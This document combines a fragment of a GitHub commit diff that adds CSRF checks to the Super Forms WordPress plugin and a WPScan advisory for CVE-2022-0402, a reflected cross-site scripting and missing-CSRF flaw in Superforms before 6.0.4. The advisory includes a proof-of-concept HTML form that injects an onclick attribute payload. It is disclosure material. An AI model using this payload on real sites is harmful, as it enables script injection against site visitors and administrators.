|  |  | // check\_ajax\_referer( 'super\_submit\_' . $form\_id, 'super\_ajax\_nonce' ); |
|  |  |  |
|  |  | // @since 4.6.0 - verify reCAPTCHA token |
|  |  | if(!empty($\_POST['version'])){ |
|  |  | $version = sanitize\_text\_field( $\_POST['version'] ); |
| Expand Down  Expand Up | | @@ -2647,6 +2661,13 @@ public static function upload\_files() { |
|  |  | die(); |
|  |  | } |
|  |  | public static function submit\_form( $settings=null ) { |
|  |  | $csrfValidation = SUPER\_Common::verifyCSRF(); |
|  |  | if(!$csrfValidation){ |
|  |  | SUPER\_Common::output\_message( |
|  |  | $error = true, |
|  |  | esc\_html\_\_( 'Unable to submit form, session expired!', 'super-forms' ) |
|  |  | ); |
|  |  | } |
|  |  | $atts = self::submit\_form\_checks($settings); |
|  |  | $data = $atts['data']; |
|  |  | $form\_id = $atts['form\_id']; |
| Expand Down  Expand Up | | @@ -3448,6 +3469,9 @@ public static function submit\_form( $settings=null ) { |
|  |  | \*/ |
|  |  | $redirect = apply\_filters( 'super\_redirect\_url\_filter', $redirect, array( 'data'=>$data, 'settings'=>$settings ) ); |
|  |  |  |
|  |  | // Destroy nonce, and generate new one for next form |
|  |  | SUPER\_Forms()->session->set( 'sf\_nonce', false ); |
|  |  | $response\_data['sf\_nonce'] = SUPER\_Common::generate\_nonce(); |
|  |  | SUPER\_Common::output\_message( |
|  |  | $error=false, |
|  |  | $msg = $msg, |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `c19d65a`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FRensTillmann%2Fsuper-forms%2Fcommit%2Fc19d65abbe43d9b6359c1bf3498dc697d0c19d02) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from wpscan.com_e3957ba8_20250115_084641.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Superforms < 6.0.4 - Reflected Cross-Site Scripting

### Description

The plugin does not escape the bob\_czy\_panstwa\_sprawa\_zostala\_rozwiazana parameter before outputting it back in an attribute via the super\_language\_switcher AJAX action, leading to a Reflected Cross-Site Scripting. The action is also lacking CSRF, making the attack easier to perform against any user.

### Proof of Concept

<html>
<body>
<form action="https://example.com/wp-admin/admin-ajax.php" method="POST">
<input type="hidden" name="action" value="super\_language\_switcher" />
<input type="hidden" name="form\_id" value="1030" />
<input type="hidden" name="i18n" value="pl\_PL" />
<input type="hidden" name="parameters[bob\_co\_mozemy\_poprawic\_aby\_panstwa\_ocena\_byla\_wyzsza]" value="555" />
<input type="hidden" name="parameters[bob\_co\_sprawilo\_taka\_ocene\_zaangazowania\_konsultanta]" value="555" />
<input type="hidden" name="parameters[bob\_czy\_konsultant\_wytlumaczyl\_dlaczego\_nie\_jest\_w\_stanie\_rozwiazac\_sprawy]" value="1" />
<input type="hidden" name="parameters[bob\_czy\_panstwa\_sprawa\_zostala\_rozwiazana]" value=" accesskey accesskey=x onclick=alert(document.domain) id=test" />
<input type="hidden" name="parameters[bob\_dlaczego\_panstwa\_zdaniem\_nie\_udalo\_sie\_rozwiazac\_problemu]" value="555" />
<input type="hidden" name="parameters[bob\_jak\_duzo\_wysilku\_wlozyles\_w\_zalatwienie\_konkretnej\_sprawy]" value="1" />
<input type="hidden" name="parameters[bob\_jakie\_czynniki\_mozemy\_poprawic\_aby\_panstwa\_ocena\_byla\_wyzsza]" value="555" />
<input type="hidden" name="parameters[bob\_na\_koniec\_prosimy\_o\_podsumowanie\_panstwa\_oceny\_oraz\_napisanie\_sugestii\_i\_uag\_dotyczacych\_obslugi]" value="555" />
<input type="hidden" name="parameters[bob\_na\_podstawie\_ostatniej\_rozmowy\_z\_naszym\_konsultantem\_ocen\_w\_skali\_zaangazowanie\_w\_rozwiazanie\_problemu]" value="1" />
<input type="hidden" name="parameters[bob\_w\_jakim\_stopniu\_sa\_panstwo\_zadowoleni\_z\_obslugi\_konsultanta]" value="1" />
<input type="hidden" name="parameters[hidden\_form\_id]" value="1030" />
<input type="hidden" name="parameters[id]" value="1" />
<input type="hidden" name="parameters[super\_ajax\_nonce]" value="" />
<input type="hidden" name="parameters[super\_hp]" value="1" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

super-forms](https://a8cteam5105.wordpress.com/plugin/super-forms/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 6.0.4

### References

CVE
[CVE-2022-0402](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0402)

URL
<https://github.com/RensTillmann/super-forms/commit/c19d65abbe43d9b6359c1bf3498dc697d0c19d02>

### Classification

Type
XSS

OWASP top 10
[A7: Cross-Site Scripting (XSS)](https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_%28XSS%29)

CWE
[CWE-79](https://cwe.mitre.org/data/definitions/79.html)

CVSS
[4.7 (medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N)

### Miscellaneous

Original Researcher
Koutrouss Naddara

Submitter
Koutrouss Naddara

Verified
Yes

WPVDB ID
[2e2e2478-2488-4c91-8af8-69b07783854f](https://a8cteam5105.wordpress.com/vulnerability/2e2e2478-2488-4c91-8af8-69b07783854f/)

### Timeline

Publicly Published
2022-01-31 (about 2 years ago)

Added
2022-01-31 (about 2 years ago)

Last Updated
2022-04-13 (about 2 years ago)

### Other

Published
Title

Published
2021-10-13
Title
[Testimonial Builder < 1.6.0 - Admin+ Stored Cross-Site Scripting](https://a8cteam5105.wordpress.com/vulnerability/365c09a7-0b10-4145-a415-5c0e9f429ae0/)

Published
2022-06-14
Title
[WordPress Team Manager < 2.0.1 - Contributor+ Stored Cross-Site Scripting](https://a8cteam5105.wordpress.com/vulnerability/72c27047-6821-43a0-9770-6efea6845b4b/)

Published
2022-11-14
Title
[WordPress Countdown Widget < 3.1.9.3 - Admin+ Stored XSS](https://a8cteam5105.wordpress.com/vulnerability/35dfb1fc-02b7-4351-984e-0b5408098cad/)

Published
2024-09-30
Title
[Unlimited Elements For Elementor (Free Widgets, Addons, Templates) < 1.5.122 - Reflected Cross-Site Scripting](https://a8cteam5105.wordpress.com/vulnerability/82f73b70-d649-4dfa-8b02-6d67157859f2/)

Published
2023-01-24
Title
[Youzify < 1.2.2 - Contributor+ Stored XSS](https://a8cteam5105.wordpress.com/vulnerability/5e26c485-9a5a-44a3-95b3-6c063a1c321c/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

